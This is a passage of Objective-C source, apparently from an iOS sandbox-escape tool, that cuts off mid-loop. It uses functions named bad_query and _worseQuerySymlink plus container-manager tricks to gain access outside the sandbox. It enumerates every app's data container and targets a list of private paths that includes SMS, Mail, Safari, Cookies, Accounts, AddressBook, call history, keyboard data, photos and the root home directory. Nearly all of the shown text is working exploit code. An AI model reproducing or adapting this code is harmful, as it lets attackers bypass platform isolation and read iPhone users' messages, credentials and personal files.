    void *cs = dlopen("/System/Library/Frameworks/CoreServices.framework/CoreServices", RTLD_LAZY);
    if (!cs) {
        FDLog(@"ls: failed to load CoreServices");
        return bundleIDs;
    }
    FDLog(@"ls: loaded CoreServices");

    Class LSWorkspace = NSClassFromString(@"LSApplicationWorkspace");
    if (!LSWorkspace) {
        FDLog(@"ls: LSApplicationWorkspace not found");
        return bundleIDs;
    }

    id workspace = [LSWorkspace performSelector:@selector(defaultWorkspace)];
    if (!workspace) return bundleIDs;

    SEL selectors[] = {
        @selector(allApplications),
        @selector(allInstalledApplications),
    };
    const char *selNames[] = { "allApplications", "allInstalledApplications" };

    for (int s = 0; s < 2; s++) {
        if (![workspace respondsToSelector:selectors[s]]) continue;
        NSArray *apps = [workspace performSelector:selectors[s]];
        FDLog([NSString stringWithFormat:@"ls: %s returned %lu", selNames[s], (unsigned long)apps.count]);
        for (id proxy in apps) {
            NSString *bid = nil;
            if ([proxy respondsToSelector:@selector(applicationIdentifier)])
                bid = [proxy performSelector:@selector(applicationIdentifier)];
            else if ([proxy respondsToSelector:@selector(bundleIdentifier)])
                bid = [proxy performSelector:@selector(bundleIdentifier)];
            if (bid.length > 0) [bundleIDs addObject:bid];
        }
        if (bundleIDs.count > 0) break;
    }

    FDLog([NSString stringWithFormat:@"ls: total=%lu", (unsigned long)bundleIDs.count]);
    return bundleIDs;
}

static NSString *_mcmResolvePath(NSString *bundleID) {
    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->querySetIdentifiers || !api->queryGetSingle || !api->objectGetPath)
        return nil;

    static const uint64_t kFlags[] = { 0x900000000ULL, 0x8100000000ULL };
    for (int f = 0; f < 2; f++) {
        void *q = api->queryCreate();
        if (!q) continue;
        api->querySetClass(q, 2);
        xpc_object_t xid = xpc_string_create(bundleID.UTF8String);
        api->querySetIdentifiers(q, xid);
        api->querySetFlags(q, kFlags[f]);
        if (api->querySetPart) api->querySetPart(q, 0);
        void *res = api->queryGetSingle(q);
        NSString *path = nil;
        if (res) {
            const char *raw = api->objectGetPath(res);
            if (raw) {
                path = [NSString stringWithUTF8String:raw];
                if (path && ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]))
                    path = [@"/private" stringByAppendingString:path];
            }
        }
        xpc_release(xid);
        api->queryFree(q);
        if (path.length > 0 && path.isAbsolutePath) return path;
    }
    return nil;
}

#pragma mark - FDEnumerateApps

static NSArray<NSDictionary<NSString *, NSString *> *> *_scanAllContainers(NSUInteger limit) {
    NSMutableArray<NSDictionary<NSString *, NSString *> *> *results = [NSMutableArray array];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];

    static const char *kDataDirs[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Data/Application",
    };

    // Grant parent directory ONCE — recursive access covers children
    for (int d = 0; d < 2; d++) {
        int64_t h = _worseQuerySymlink(kDataDirs[d]);
        if (h >= 0) {
            FDLog([NSString stringWithFormat:@"scan: WQ-SYM parent OK h=%lld dir=%s",
                   (long long)h, kDataDirs[d]]);
            break;
        }
        h = _worseQueryGrant(kDataDirs[d], "fd-scan");
        if (h >= 0) {
            FDLog([NSString stringWithFormat:@"scan: WQ-PD parent OK h=%lld dir=%s",
                   (long long)h, kDataDirs[d]]);
            break;
        }
        h = bad_query((char *)kDataDirs[d], true, NULL, false);
        if (h >= 0) {
            FDLog([NSString stringWithFormat:@"scan: BQ parent OK h=%lld dir=%s",
                   (long long)h, kDataDirs[d]]);
            break;
        }
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        for (int g = 0; g < rtGroupCount; g++) {
            h = bad_query((char *)kDataDirs[d], true, (char *)rtGroups[g], false);
            if (h >= 0) {
                FDLog([NSString stringWithFormat:@"scan: BQ-AG parent OK dir=%s", kDataDirs[d]]);
                break;
            }
        }
        if (h >= 0) break;
    }

    for (int d = 0; d < 2 && results.count < limit; d++) {
        DIR *dir = opendir(kDataDirs[d]);
        if (!dir) {
            FDLog([NSString stringWithFormat:@"scan: opendir FAILED dir=%s errno=%d",
                   kDataDirs[d], errno]);
            continue;
        }

        FDLog([NSString stringWithFormat:@"scan: opendir OK dir=%s", kDataDirs[d]]);
        int dirCount = 0;
        int plistOK = 0;

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL && results.count < limit) {
            if (entry->d_name[0] == '.') continue;
            if (entry->d_type != DT_DIR && entry->d_type != DT_UNKNOWN) continue;
            if (strlen(entry->d_name) < 32) continue;
            dirCount++;

            char fullPath[1200];
            snprintf(fullPath, sizeof(fullPath), "%s/%s", kDataDirs[d], entry->d_name);

            char metaPath[1200];
            snprintf(metaPath, sizeof(metaPath),
                     "%s/.com.apple.mobile_container_manager.metadata.plist",
                     fullPath);

            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:
                [NSString stringWithUTF8String:metaPath]];

            NSString *identifier = nil;
            if (plist) {
                plistOK++;
                identifier = plist[@"MCMMetadataIdentifier"];
            }
            if (!identifier.length) {
                identifier = [NSString stringWithUTF8String:entry->d_name];
            }

            if ([seen containsObject:identifier]) continue;
            [seen addObject:identifier];

            NSMutableDictionary *dict = [NSMutableDictionary dictionary];
            dict[@"identifier"] = identifier;
            dict[@"path"] = [NSString stringWithUTF8String:fullPath];
            [results addObject:dict];
        }
        closedir(dir);

        FDLog([NSString stringWithFormat:
            @"scan: dir=%s dirs=%d plist_ok=%d results=%lu",
            kDataDirs[d], dirCount, plistOK, (unsigned long)results.count]);
    }

    FDLog([NSString stringWithFormat:@"Directory scan found %lu containers",
           (unsigned long)results.count]);
    return results;
}

NSArray<NSDictionary<NSString *, NSString *> *> *FDEnumerateApps(NSUInteger limit) {
    NSMutableArray<NSDictionary<NSString *, NSString *> *> *results = [NSMutableArray array];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];

    // Pass 1: MCM class-2 enumeration
    NSArray<NSString *> *identifiers = _enumerateIdentifiers(2, limit);
    FDLog([NSString stringWithFormat:@"MCM enumerated %lu app identifiers",
           (unsigned long)identifiers.count]);

    for (NSString *ident in identifiers) {
        NSString *path = _queryContainerPath(2, ident, NO, 0x900000000ULL);
        if (!path) path = _queryContainerPath(2, ident, NO, 0x8100000000ULL);

        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        entry[@"identifier"] = ident;
        if (path) entry[@"path"] = path;
        [results addObject:entry];
        [seen addObject:ident];

        if (results.count >= limit) break;
    }

    // Pass 2: LaunchServices API + csstore parsing → MCM-C2 batch resolve
    // This is how 3105 discovers apps on iOS 27+
    {
        NSMutableSet *bundleCandidates = [NSMutableSet set];

        // 2a: Try LaunchServices workspace API
        NSArray *lsApps = _launchServicesEnumerate();
        for (NSString *bid in lsApps) {
            if (![seen containsObject:bid])
                [bundleCandidates addObject:bid];
        }

        // 2b: Parse LaunchServices csstore files
        NSSet *csCandidates = _findAndParseCSStores();
        for (NSString *bid in csCandidates) {
            if (![seen containsObject:bid])
                [bundleCandidates addObject:bid];
        }

        FDLog([NSString stringWithFormat:@"LS+csstore: %lu new candidates to resolve",
               (unsigned long)bundleCandidates.count]);

        // 2c: Resolve container paths extracted directly from csstore
        // WQ-SYM grants directory access; try plist then csstore cross-reference
        int pathResolved = 0;
        int pathCrossRef = 0;
        NSSet *csPaths = sCSStoreContainerPaths ? [[sCSStoreContainerPaths copy] autorelease] : [NSSet set];
        NSDictionary *csPathMap = sCSStorePathToBundle ? [[sCSStorePathToBundle copy] autorelease] : @{};
        FDLog([NSString stringWithFormat:@"csstore-paths: %lu paths, %lu cross-refs available",
               (unsigned long)csPaths.count, (unsigned long)csPathMap.count]);

        for (NSString *containerPath in csPaths) {
            if (results.count >= limit) break;
            @autoreleasepool {
                if ([containerPath rangeOfString:@"/Data/Application/"].location == NSNotFound)
                    continue;

                int64_t h = _worseQuerySymlink(containerPath.fileSystemRepresentation);
                if (h < 0) continue;

                NSString *bid = nil;

                // Method 1: Foundation plist read
                NSString *metaPath = [containerPath stringByAppendingPathComponent:
                    @".com.apple.mobile_container_manager.metadata.plist"];
                NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
                bid = meta[@"MCMMetadataIdentifier"];

                // Method 2: Low-level C read + NSPropertyListSerialization
                if (!bid) {
                    int fd = open(metaPath.fileSystemRepresentation, O_RDONLY);
                    if (fd >= 0) {
                        struct stat st;
                        if (fstat(fd, &st) == 0 && st.st_size > 0 && st.st_size < 65536) {
                            void *buf = malloc((size_t)st.st_size);
                            if (buf) {
                                ssize_t rd = read(fd, buf, (size_t)st.st_size);
                                if (rd > 0) {
                                    NSData *d = [NSData dataWithBytesNoCopy:buf
                                        length:(NSUInteger)rd freeWhenDone:YES];
                                    NSDictionary *p = [NSPropertyListSerialization
                                        propertyListWithData:d
                                        options:NSPropertyListImmutable
                                        format:NULL error:nil];
                                    bid = p[@"MCMMetadataIdentifier"];
                                } else {
                                    free(buf);
                                }
                            }
                        }
                        close(fd);
                    }
                }

                // Method 3: csstore binary proximity cross-reference
                if (!bid) {
                    bid = csPathMap[containerPath];
                    if (bid) pathCrossRef++;
                }

                if (bid.length > 0 && ![seen containsObject:bid]) {
                    pathResolved++;
                    [seen addObject:bid];
                    [bundleCandidates removeObject:bid];
                    NSMutableDictionary *entry = [NSMutableDictionary dictionary];
                    entry[@"identifier"] = bid;
                    entry[@"path"] = containerPath;
                    [results addObject:entry];
                }
            }
        }
        FDLog([NSString stringWithFormat:@"csstore-paths: resolved %d (crossRef=%d)",
               pathResolved, pathCrossRef]);

        // 2d: Batch-resolve remaining candidates via MCM class-2 (with early bailout)
        int resolved = 0;
        int consecutiveFails = 0;
        int attempted = 0;
        for (NSString *bid in bundleCandidates) {
            if (results.count >= limit) break;
            if (consecutiveFails >= 500) break;
            @autoreleasepool {
                attempted++;
                NSString *path = _mcmResolvePath(bid);
                if (path) {
                    resolved++;
                    consecutiveFails = 0;
                    [seen addObject:bid];
                    NSMutableDictionary *entry = [NSMutableDictionary dictionary];
                    entry[@"identifier"] = bid;
                    entry[@"path"] = path;
                    [results addObject:entry];
                } else {
                    consecutiveFails++;
                }
            }
        }

        FDLog([NSString stringWithFormat:
            @"MHA-C2 resolved %d/%d attempted (%lu total candidates, bailout@%d consecutive fails)",
            resolved, attempted, (unsigned long)bundleCandidates.count, consecutiveFails]);
    }

    // Pass 3: Directory scan (fallback)
    {
        NSArray *scanned = _scanAllContainers(limit);
        for (NSDictionary *dict in scanned) {
            NSString *ident = dict[@"identifier"];
            if ([seen containsObject:ident]) continue;
            [seen addObject:ident];
            [results addObject:dict];
            if (results.count >= limit) break;
        }
    }

    FDLog([NSString stringWithFormat:@"Total enumerated: %lu containers",
           (unsigned long)results.count]);
    return results;
}

#pragma mark - FDDiscoverContainerPath

static NSString *_scanContainerDir(const char *basePath, NSString *targetBundleID) {
    DIR *dir = opendir(basePath);
    if (!dir) return nil;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR && entry->d_type != DT_UNKNOWN) continue;
        if (entry->d_name[0] == '.') continue;
        if (strlen(entry->d_name) < 32) continue;

        char metaPath[1200];
        snprintf(metaPath, sizeof(metaPath),
                 "%s/%s/.com.apple.mobile_container_manager.metadata.plist",
                 basePath, entry->d_name);

        NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:
            [NSString stringWithUTF8String:metaPath]];
        if (!plist) continue;

        NSString *identifier = plist[@"MCMMetadataIdentifier"];
        if ([identifier isEqualToString:targetBundleID]) {
            closedir(dir);
            char fullPath[1200];
            snprintf(fullPath, sizeof(fullPath),
                     "/private/var/mobile/Containers/Data/Application/%s",
                     entry->d_name);
            return [NSString stringWithUTF8String:fullPath];
        }
    }
    closedir(dir);
    return nil;
}

NSString *FDDiscoverContainerPath(NSString *bundleID) {
    if (!bundleID || bundleID.length == 0) return nil;

    FDLog([NSString stringWithFormat:@"Discovering container for %@", bundleID]);

    // Pass 0: MCM class-2 direct query
    {
        static const uint64_t kFlagSets[] = { 0x900000000ULL, 0x8100000000ULL };
        for (int f = 0; f < 2; f++) {
            NSString *path = _queryContainerPath(2, bundleID, NO, kFlagSets[f]);
            if (path.length > 0 && path.isAbsolutePath) return path;
        }
    }

    // Pass 0b: MCM enumeration check
    {
        NSArray<NSString *> *ids = _enumerateIdentifiers(2, 500);
        if ([ids containsObject:bundleID]) {
            NSString *path = _queryContainerPath(2, bundleID, NO, 0x900000000ULL);
            if (path.length > 0) return path;
        }
    }

    // Grant access to parent containers directory
    _worseQuerySymlink("/private/var/mobile/Containers/Data/Application");
    _worseQueryGrant("/private/var/mobile/Containers/Data/Application", "fd-discover");

    static const char *kDirs[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Data/Application",
    };

    // Pass 1: try scanning without extra grants
    for (int i = 0; i < 2; i++) {
        NSString *found = _scanContainerDir(kDirs[i], bundleID);
        if (found) return found;
    }

    // Pass 2: grant via bad_query and scan
    for (int i = 0; i < 2; i++) {
        int64_t h = bad_query((char *)kDirs[i], true, NULL, false);
        if (h >= 0) {
            NSString *found = _scanContainerDir(kDirs[i], bundleID);
            if (found) return found;
        }
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        for (int g = 0; g < rtGroupCount; g++) {
            h = bad_query((char *)kDirs[i], true, (char *)rtGroups[g], false);
            if (h >= 0) {
                NSString *found = _scanContainerDir(kDirs[i], bundleID);
                if (found) return found;
            }
        }
    }

    FDLog([NSString stringWithFormat:@"Container not found for %@", bundleID]);
    return nil;
}

#pragma mark - FDResolveBundlePath

NSString *FDResolveBundlePath(NSString *bundleID) {
    if (!bundleID.length) return nil;

    // Method 1: csstore reverse mapping (fastest, thread-safe read)
    _ensureEngineMutex();
    pthread_mutex_lock(&sEngineMutex);
    if (sCSStoreBIDToBundlePath) {
        NSString *path = [sCSStoreBIDToBundlePath objectForKey:bundleID];
        if (path) {
            pthread_mutex_unlock(&sEngineMutex);
            return path;
        }
    }
    pthread_mutex_unlock(&sEngineMutex);

    // Method 2: LSApplicationProxy (no mutex needed, runtime API)
    @try {
        Class LSProxy = NSClassFromString(@"LSApplicationProxy");
        if (LSProxy) {
            SEL sel = @selector(applicationProxyForIdentifier:);
            if ([LSProxy respondsToSelector:sel]) {
                id proxy = [LSProxy performSelector:sel withObject:bundleID];
                if (proxy) {
                    NSURL *bundleURL = nil;
                    if ([proxy respondsToSelector:@selector(bundleContainerURL)])
                        bundleURL = [proxy performSelector:@selector(bundleContainerURL)];
                    if (!bundleURL && [proxy respondsToSelector:@selector(bundleURL)]) {
                        bundleURL = [proxy performSelector:@selector(bundleURL)];
                        if (bundleURL)
                            bundleURL = [bundleURL URLByDeletingLastPathComponent];
                    }
                    if (bundleURL) {
                        NSString *path = bundleURL.path;
                        if ([path hasPrefix:@"/var/"])
                            path = [@"/private" stringByAppendingString:path];
                        if (path.length > 0) {
                            pthread_mutex_lock(&sEngineMutex);
                            if (!sCSStoreBIDToBundlePath)
                                sCSStoreBIDToBundlePath = [[NSMutableDictionary alloc] init];
                            [sCSStoreBIDToBundlePath setObject:path forKey:bundleID];
                            pthread_mutex_unlock(&sEngineMutex);
                            return path;
                        }
                    }
                }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[FD] LSProxy bundle exception for %@: %@", bundleID, e);
    }

    // Method 3: MCM class-2 with part=1 (no outer mutex — MCM has own locking)
    @try {
        MCMAPI *api = FDGetAPI();
        if (api->queryCreate && api->querySetIdentifiers && api->queryGetSingle && api->objectGetPath) {
            static const uint64_t kFlags[] = { 0x900000000ULL, 0x8100000000ULL, 0x100000000ULL };
            for (int f = 0; f < 3; f++) {
                void *q = api->queryCreate();
                if (!q) continue;
                api->querySetClass(q, 2);
                xpc_object_t xid = xpc_string_create(bundleID.UTF8String);
                api->querySetIdentifiers(q, xid);
                api->querySetFlags(q, kFlags[f]);
                if (api->querySetPart) api->querySetPart(q, 1);
                void *res = api->queryGetSingle(q);
                NSString *path = nil;
                if (res) {
                    const char *raw = api->objectGetPath(res);
                    if (raw) {
                        path = [NSString stringWithUTF8String:raw];
                        if (path && ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]))
                            path = [@"/private" stringByAppendingString:path];
                    }
                }
                xpc_release(xid);
                api->queryFree(q);
                if (path.length > 0 && path.isAbsolutePath) {
                    pthread_mutex_lock(&sEngineMutex);
                    if (!sCSStoreBIDToBundlePath)
                        sCSStoreBIDToBundlePath = [[NSMutableDictionary alloc] init];
                    [sCSStoreBIDToBundlePath setObject:path forKey:bundleID];
                    pthread_mutex_unlock(&sEngineMutex);
                    return path;
                }
            }
        }
    } @catch (NSException *e) {
        NSLog(@"[FD] MCM bundle query exception for %@: %@", bundleID, e);
    }

    // Method 4: Bulk scan /private/var/containers/Bundle/Application/
    @try {
        static BOOL sBundleScanDone = NO;
        if (!sBundleScanDone) {
            sBundleScanDone = YES;
            static NSString *const kBundleBase = @"/private/var/containers/Bundle/Application";
            // Grant sandbox access before scanning — use part=1 for bundle containers
            _worseQuerySymlinkWithPart(kBundleBase.UTF8String, 1);
            FDGrantAccessSafe(kBundleBase.UTF8String);
            NSFileManager *fm = [NSFileManager defaultManager];
            NSArray *entries = [fm contentsOfDirectoryAtPath:kBundleBase error:nil];
            NSUInteger found = 0;
            for (NSString *uuid in entries) {
                @autoreleasepool {
                    NSString *uuidDir = [kBundleBase stringByAppendingPathComponent:uuid];
                    NSArray *appEntries = [fm contentsOfDirectoryAtPath:uuidDir error:nil];
                    if (!appEntries.count) {
                        _worseQuerySymlinkWithPart(uuidDir.UTF8String, 1);
                        appEntries = [fm contentsOfDirectoryAtPath:uuidDir error:nil];
                    }
                    if (!appEntries.count) {
                        FDGrantAccessSafe(uuidDir.UTF8String);
                        appEntries = [fm contentsOfDirectoryAtPath:uuidDir error:nil];
                    }
                    for (NSString *entry in appEntries) {
                        if (![entry hasSuffix:@".app"]) continue;
                        NSString *plistPath = [[uuidDir stringByAppendingPathComponent:entry]
                                               stringByAppendingPathComponent:@"Info.plist"];
                        NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:plistPath];
                        NSString *bid = info[@"CFBundleIdentifier"];
                        if (bid.length > 0) {
                            pthread_mutex_lock(&sEngineMutex);
                            if (!sCSStoreBIDToBundlePath)
                                sCSStoreBIDToBundlePath = [[NSMutableDictionary alloc] init];
                            if (![sCSStoreBIDToBundlePath objectForKey:bid]) {
                                [sCSStoreBIDToBundlePath setObject:uuidDir forKey:bid];
                                found++;
                            }
                            pthread_mutex_unlock(&sEngineMutex);
                        }
                    }
                }
            }
            NSLog(@"[FD] Bundle scan found %lu new bundle paths", (unsigned long)found);
            // Re-check cache after bulk scan
            pthread_mutex_lock(&sEngineMutex);
            NSString *cachedPath = [sCSStoreBIDToBundlePath objectForKey:bundleID];
            pthread_mutex_unlock(&sEngineMutex);
            if (cachedPath) return cachedPath;
        }
    } @catch (NSException *e) {
        NSLog(@"[FD] Bundle scan exception for %@: %@", bundleID, e);
    }

    return nil;
}

#pragma mark - FDExtractAppIcon

NSData *FDExtractAppIcon(NSString *bundleID) {
    if (!bundleID.length) return nil;

    @try {
        NSString *bundlePath = FDResolveBundlePath(bundleID);
        if (!bundlePath) return nil;

        NSFileManager *fm = [NSFileManager defaultManager];

        // Find .app directory inside bundle container
        NSArray *contents = [fm contentsOfDirectoryAtPath:bundlePath error:nil];
        if (!contents.count) {
            _worseQuerySymlinkWithPart(bundlePath.UTF8String, 1);
            contents = [fm contentsOfDirectoryAtPath:bundlePath error:nil];
        }
        if (!contents.count) {
            FDGrantAccessSafe(bundlePath.UTF8String);
            contents = [fm contentsOfDirectoryAtPath:bundlePath error:nil];
        }
        NSString *appDir = nil;
        for (NSString *name in contents) {
            if ([name hasSuffix:@".app"]) {
                appDir = [bundlePath stringByAppendingPathComponent:name];
                break;
            }
        }
        if (!appDir) return nil;

        // Read Info.plist
        NSString *infoPlist = [appDir stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:infoPlist];

        // Collect icon names from Info.plist
        NSMutableArray *iconNames = [NSMutableArray array];
        if (info) {
            NSDictionary *icons = info[@"CFBundleIcons"];
            if (icons) {
                NSDictionary *primary = icons[@"CFBundlePrimaryIcon"];
                if (primary) {
                    NSArray *files = primary[@"CFBundleIconFiles"];
                    if (files) [iconNames addObjectsFromArray:files];
                }
            }
            NSDictionary *iconsPad = info[@"CFBundleIcons~ipad"];
            if (iconsPad) {
                NSDictionary *primary = iconsPad[@"CFBundlePrimaryIcon"];
                if (primary) {
                    NSArray *files = primary[@"CFBundleIconFiles"];
                    if (files) [iconNames addObjectsFromArray:files];
                }
            }
            NSArray *legacy = info[@"CFBundleIconFiles"];
            if (legacy) [iconNames addObjectsFromArray:legacy];
            NSString *singleIcon = info[@"CFBundleIconFile"];
            if (singleIcon) [iconNames addObject:singleIcon];
        }

        // Try each icon name with various suffixes
        NSArray *suffixes = @[@"@3x.png", @"@2x.png", @".png", @"@3x", @"@2x", @""];
        for (NSString *name in iconNames) {
            for (NSString *suffix in suffixes) {
                NSString *iconPath = [appDir stringByAppendingPathComponent:
                    [name stringByAppendingString:suffix]];
                NSData *data = [NSData dataWithContentsOfFile:iconPath];
                if (data.length > 100) return data;
            }
        }

        // Fallback: common icon filenames
        NSArray *fallbacks = @[
            @"AppIcon60x60@3x.png", @"AppIcon60x60@2x.png",
            @"AppIcon76x76@2x.png", @"AppIcon40x40@3x.png",
            @"AppIcon@3x.png", @"AppIcon@2x.png",
            @"Icon-60@3x.png", @"Icon-60@2x.png",
            @"Icon@2x.png", @"Icon.png",
            @"iTunesArtwork",
        ];
        for (NSString *name in fallbacks) {
            NSString *iconPath = [appDir stringByAppendingPathComponent:name];
            NSData *data = [NSData dataWithContentsOfFile:iconPath];
            if (data.length > 100) return data;
        }
    } @catch (NSException *e) {
        NSLog(@"[FD] FDExtractAppIcon exception for %@: %@", bundleID, e);
    }

    return nil;
}

#pragma mark - FDContainerEngineInit

int FDContainerEngineInit(void) {
    FDLog(@"Initializing container engine...");
    _diagReset();

    // Phase 0: Attempt sandbox profile relaxation (best effort)
    _attemptSandboxRelax();

    static const char *kEscapePaths[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/private/var/mobile/Containers/Data/System",
        "/private/var/mobile/Containers/Shared/AppGroup",
        "/private/var/mobile/Containers/Shared/SystemGroup",
        "/private/var/mobile/Library/Caches",
        "/private/var/mobile/Containers/Data/InternalDaemon",
        "/private/var/mobile/Library",
        "/private/var/mobile/Library/Preferences",
        "/private/var/mobile/Library/Safari",
        "/private/var/mobile/Library/Mail",
        "/private/var/mobile/Library/SMS",
        "/private/var/mobile/Library/Notes",
        "/private/var/mobile/Library/Cookies",
        "/private/var/mobile/Library/Accounts",
        "/private/var/mobile/Library/Calendar",
        "/private/var/mobile/Library/AddressBook",
        "/private/var/mobile/Library/CallHistoryDB",
        "/private/var/mobile/Library/Keyboard",
        "/private/var/mobile/Library/SpringBoard",
        "/private/var/mobile/Library/Logs",
        "/private/var/mobile/Library/ConfigurationProfiles",
        "/private/var/mobile/Media",
        "/private/var/mobile/Media/DCIM",
        "/private/var/mobile/Media/PhotoData",
        "/private/var/mobile/Media/Downloads",
        "/private/var/mobile/Documents",
        "/private/var/db",
        "/private/var/db/lsd",
        "/private/var/logs",
        "/private/var/preferences",
        "/private/var/root",
        "/private/var/root/Library",
        "/private/var/MobileDevice",
        "/private/var/MobileDevice/ProvisioningProfiles",
        "/private/var/mobile/Containers/Data/PluginKitPlugin",
        "/private/var/mobile/Containers/Shared",
        "/private/var/containers",
        "/private/var/containers/Bundle/Application",
        "/private/var/containers/Data/System",
        "/private/var/tmp",
        "/private/var/wireless",
        "/private/var/installd",
        "/private/var/MobileSoftwareUpdate",
    };
    int n = sizeof(kEscapePaths) / sizeof(kEscapePaths[0]);
    int granted = 0;

    // Pass 1: WQ-SYM on all paths (primary for iOS 27+)
    for (int i = 0; i < n; i++) {
        int64_t h = _worseQuerySymlink(kEscapePaths[i]);
        if (h < 0 && strstr(kEscapePaths[i], "Bundle/")) {
            h = _worseQuerySymlinkWithPart(kEscapePaths[i], 1);
            if (h >= 0)
                FDLog([NSString stringWithFormat:@"init WQ-SYM-Bundle OK: %s h=%lld",
                       kEscapePaths[i], (long long)h]);
        }
        if (h >= 0) {
            granted++;
            _diagAppend("init-sym: %s OK | ", kEscapePaths[i]);
            FDLog([NSString stringWithFormat:@"init WQ-SYM OK: %s h=%lld",
                   kEscapePaths[i], (long long)h]);
        } else {
            FDLog([NSString stringWithFormat:@"init WQ-SYM FAIL: %s rc=%lld",
                   kEscapePaths[i], (long long)h]);
        }
    }

    // Pass 1.5: Discover lsd InternalDaemon container and grant access
    // This is CRITICAL for iOS 27+ — lsd keeps csstore files in its own container
    {
        static const struct { uint64_t cls; const char *ident; bool grp; } kSysContainers[] = {
            { 10, "com.apple.lsd",       false },
            { 10, "com.apple.swcd",      false },
            { 12, "com.apple.geod",      false },
            { 12, "com.apple.eligibilityd", false },
            { 13, "systemgroup.com.apple.mobilegestaltcache", true },
            { 13, "systemgroup.com.apple.installcoordinationd", true },
            { 15, "com.apple.appmanagedfeaturesd", false },
        };
        int nsys = sizeof(kSysContainers) / sizeof(kSysContainers[0]);
        for (int si = 0; si < nsys; si++) {
            NSString *ident = [NSString stringWithUTF8String:kSysContainers[si].ident];
            NSString *path = _mcmQuerySystemContainerPath(
                kSysContainers[si].cls, ident, kSysContainers[si].grp);
            if (!path) continue;
            int fd = open(path.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
            if (fd >= 0) {
                close(fd);
                FDLog([NSString stringWithFormat:@"init sys-container %@ already accessible", ident]);
                continue;
            }
            int64_t h = _worseQuerySymlink(path.fileSystemRepresentation);
            if (h >= 0) {
                granted++;
                _diagAppend("init-sys-sym: %s OK | ", ident.UTF8String);
                FDLog([NSString stringWithFormat:@"init sys-container WQ-SYM OK: %@ -> %@ h=%lld",
                       ident, path, (long long)h]);
            } else {
                h = _worseQueryGrant(path.fileSystemRepresentation, "fd-sys");
                if (h >= 0) {
                    granted++;
                    _diagAppend("init-sys-pd: %s OK | ", ident.UTF8String);
                    FDLog([NSString stringWithFormat:@"init sys-container WQ-PD OK: %@ -> %@ h=%lld",
                           ident, path, (long long)h]);
                } else {
                    FDLog([NSString stringWithFormat:@"init sys-container FAIL: %@ -> %@", ident, path]);
                }
            }
        }
    }

    // Pass 2: WQ partDomain for paths not yet accessible
    for (int i = 0; i < n; i++) {
        int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (fd >= 0) { close(fd); continue; }
        int64_t h = _worseQueryGrant(kEscapePaths[i], "fd-init");
        if (h >= 0) {
            granted++;
            _diagAppend("init-pd: %s OK | ", kEscapePaths[i]);
            FDLog([NSString stringWithFormat:@"init WQ-PD OK: %s h=%lld",
                   kEscapePaths[i], (long long)h]);
        }
    }

    // Pass 3: MCM class-7 app group activation for paths still not accessible
    {
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        MCMAPI *api = FDGetAPI();
        if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
            for (int i = 0; i < n; i++) {
                int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                if (fd >= 0) { close(fd); continue; }
                bool got = false;
                for (int g = 0; g < rtGroupCount && !got; g++) {
                    static const uint64_t kC7Flags[] = { 0x900000000ULL, 0x8100000000ULL };
                    for (int fi = 0; fi < 2 && !got; fi++) {
                        void *q = api->queryCreate();
                        if (!q) continue;
                        api->querySetClass(q, 7);
                        xpc_object_t xid = xpc_string_create(rtGroups[g]);
                        api->querySetGroupIdentifiers(q, xid);
                        api->querySetFlags(q, kC7Flags[fi]);
                        if (api->querySetPart) api->querySetPart(q, 0);
                        void *res = api->queryGetSingle(q);
                        if (res && api->objectCopy) {
                            void *act = api->objectCopy(res);
                            if (act) {
                                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                                bool activated = false;
                                if (token && token[0] != '\0')
                                    activated = api->objectActivate(act, false);
                                free(token);
                                if (activated) {
                                    fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                                    if (fd >= 0) {
                                        close(fd);
                                        granted++;
                                        _storeLease(api, q, act, rtGroups[g], kEscapePaths[i]);
                                        xpc_release(xid);
                                        _diagAppend("init-c7: %s OK g[%d] | ", kEscapePaths[i], g);
                                        FDLog([NSString stringWithFormat:
                                            @"init MCM-C7 OK: g[%d] f=%d %s", g, fi, kEscapePaths[i]]);
                                        got = true;
                                        continue;
                                    }
                                }
                                if (api->objectFree) api->objectFree(act);
                            }
                        }
                        if (!got) {
                            xpc_release(xid);
                            api->queryFree(q);
                        }
                    }
                }
            }
        }
    }

    // Pass 4: bad_query fallback for paths still not accessible
    for (int i = 0; i < n; i++) {
        int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (fd >= 0) { close(fd); continue; }
        int64_t h = bad_query((char *)kEscapePaths[i], true, NULL, false);
        if (h >= 0) {
            granted++;
            _diagAppend("init-bq: %s OK | ", kEscapePaths[i]);
            FDLog([NSString stringWithFormat:@"init BQ OK: %s h=%lld",
                   kEscapePaths[i], (long long)h]);
            continue;
        }
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        for (int g = 0; g < rtGroupCount; g++) {
            h = bad_query((char *)kEscapePaths[i], true, (char *)rtGroups[g], false);
            if (h >= 0) {
                granted++;
